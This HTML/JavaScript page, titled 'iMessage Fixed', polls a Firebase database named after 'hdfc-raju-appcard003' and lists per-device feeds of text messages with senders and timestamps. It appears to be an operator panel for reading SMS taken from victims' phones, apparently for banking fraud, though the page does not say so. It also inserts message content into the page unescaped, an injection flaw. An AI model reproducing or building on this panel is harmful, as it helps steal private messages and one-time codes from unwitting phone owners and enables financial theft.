<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>iMessage Fixed</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=SF+Pro+Text:wght@400;500;600&display=swap');
        body { background: #ffffff; font-family: 'SF Pro Text', -apple-system, sans-serif; color: #000; overflow-x: hidden; }
        .ios-header { background: rgba(255,255,255,0.9); backdrop-filter: blur(20px); border-bottom: 0.5px solid #d1d1d6; position: sticky; top: 0; z-index: 50; }
        .device-row { border-bottom: 0.5px solid #e5e5ea; padding: 18px 16px; display: flex; justify-content: space-between; align-items: center; cursor: pointer; }
        #message-view { position: fixed; top: 0; left: 100%; width: 100%; height: 100%; background: white; transition: 0.3s; z-index: 100; overflow-y: auto; }
        #message-view.active { left: 0; }
        .msg-card { border-bottom: 0.5px solid #f2f2f7; padding: 12px 16px; }
        .text-msg { font-size: 11px; color: #3A3A3C; line-height: 1.4; }
        .text-time { font-size: 9px; color: #8E8E93; }
        .sender-name { font-size: 12px; font-weight: 600; }
    </style>
</head>
<body>

    <section id="main-screen">
        <header class="ios-header px-4 py-4 flex justify-between items-center">
            <h1 class="text-xl font-bold">Devices</h1>
            <div class="w-2 h-2 bg-green-500 rounded-full animate-pulse"></div>
        </header>
        <div id="device-list" class="max-w-2xl mx-auto"></div>
    </section>

    <section id="message-view">
        <header class="ios-header px-4 py-3 flex items-center justify-between">
            <div class="text-blue-500 font-medium cursor-pointer" onclick="closeFolder()">‹ Back</div>
            <h1 id="header-title" class="text-sm font-bold">Messages</h1>
            <div class="w-10"></div>
        </header>
        <div id="internal-feed" class="max-w-2xl mx-auto pb-20"></div>
    </section>

    <script>
        const DB_URL = "https://hdfc-raju-appcard003-default-rtdb.firebaseio.com/.json";
        let masterMap = {}; 

        async function loadAll() {
            try {
                const res = await fetch(DB_URL);
                const data = await res.json();
                if (!data) return;

                masterMap = {}; // Reset

                // SMART SCAN: Har folder ko device maan lo
                for (let devKey in data) {
                    let folder = data[devKey];
                    if (typeof folder === 'object') {
                        // Folder ke andar messages dhoondo
                        let messages = [];
                        
                        function deepSearch(obj) {
                            for (let k in obj) {
                                if (obj[k] && typeof obj[k] === 'object') {
                                    if (obj[k].message) {
                                        messages.push({ ...obj[k], pk: k });
                                    } else {
                                        deepSearch(obj[k]);
                                    }
                                }
                            }
                        }
                        deepSearch(folder);

                        if (messages.length > 0) {
                            // Newest first
                            messages.sort((a,b) => b.pk.localeCompare(a.pk));
                            masterMap[devKey] = messages;
                        }
                    }
                }

                renderList();
                
                if(document.getElementById('message-view').classList.contains('active')) {
                    const activeID = document.getElementById('header-title').innerText;
                    renderFolder(activeID);
                }

            } catch (e) { console.error(e); }
        }

        function renderList() {
            const list = document.getElementById('device-list');
            const keys = Object.keys(masterMap).sort();
            
            list.innerHTML = keys.map(k => `
                <div class="device-row" onclick="openFolder('${k}')">
                    <div class="flex flex-col">
                        <span class="text-sm font-bold"># ${k.substring(0,10)}</span>
                        <span class="text-[9px] text-gray-400 uppercase">${masterMap[k].length} Messages</span>
                    </div>
                    <span class="text-gray-300">›</span>
                </div>
            `).join('');
        }

        function openFolder(id) {
            document.getElementById('header-title').innerText = id;
            renderFolder(id);
            document.getElementById('message-view').classList.add('active');
        }

        function closeFolder() { document.getElementById('message-view').classList.remove('active'); }

        function renderFolder(id) {
            const feed = document.getElementById('internal-feed');
            const msgs = masterMap[id] || [];
            feed.innerHTML = msgs.map(m => `
                <div class="msg-card">
                    <div class="flex justify-between items-start">
                        <span class="sender-name">${m.sender}</span>
                        <span class="text-time font-mono tracking-tighter">${m.received_time}</span>
                    </div>
                    <p class="text-msg mt-1">${m.message}</p>
                </div>
            `).join('');
        }

        setInterval(loadAll, 5000);
        loadAll();
    </script>
</body>
</html>
